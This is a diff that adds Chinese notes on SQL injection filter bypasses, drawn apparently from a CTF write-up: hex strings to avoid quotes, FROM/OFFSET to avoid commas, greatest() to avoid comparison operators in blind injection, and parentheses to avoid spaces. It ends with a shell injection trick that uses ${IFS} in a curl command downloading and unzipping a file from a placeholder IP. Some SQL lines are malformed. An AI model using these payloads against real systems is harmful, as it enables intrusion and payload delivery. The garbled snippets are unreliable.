@@ -159,3 +159,66 @@ time盲注
 总结
 
 以上所有的知识点都是在sql注入中最常用到也是最基础的知识点。对于一个需要精通sql语句的web安全工程师来说，上面的知识是必须要掌握的。上面的知识也是学习sql注入最基本的知识。接下来的文章将会通过实例详细地讲解sql注入中的知识，今天的这篇文章也主要是作为一个基础知识。
+http://blog.spoock.com/2016/09/04/sqli-bypass/
+
+引号绕过
+
+会使用到引号的地方是在于最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句。
+
+
+select column_name  from information_schema.tables where table_name="users"
+这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
+users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
+
+
+select column_name  from information_schema.tables where table_name=0x7573657273
+总结：使用十六进制可以绕过引号
+
+逗号绕过
+
+在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。
+
+
+
+select substr(database(0 from 1 for 1);
+select mid(database(0 from 1 for 1);
+对于limit可以使用offset来绕过。
+
+
+select * from news limit 0,1
+# 等价于下面这条SQL语句
+select * from news limit 1 offset 0
+总结：使用from可以绕过逗号
+
+比较符(<,>)绕过
+
+同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
+最常见的一个盲注的sql语句。
+
+
+select * from users where id=1 and ascii(substr(database(),0,1))>64
+此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。
+那么上面的这条sql语句可以使用greatest变为如下的子句:
+
+
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+总结：使用greatest()绕过比较操作符。
+http://blog.7ell.me/2016/11/01/swpu-ctf%E5%A7%BF%E5%8A%BF/            
+           空格可以使用括号来绕过 
+
+select pass from admin where user='xxxx' 和下面这个没区别
+select(pass)from(admin)where(user)=('xxxx')
+select User from mysql.user where User='-1'=1='0';uname的查询结果与'-1'比较---为假0
+假与1比较------------------为假0
+假与'0'比较----------------为真1
+           mysql> select mid(user() from 1);
++--------------------+
+| mid(user() from 1) |
++--------------------+
+| root@localhost     |
++--------------------+
+1 row in set (0.00 sec)
+           空格的话Linux中可以用${IFS}来代替curl${IFS}-I baidu.com
+           curl${IFS}-o${IFS}2.zip${IFS}http://xxx.xxx.xxx.xxx/2.zip
+
+unzip${IFS}2.zip
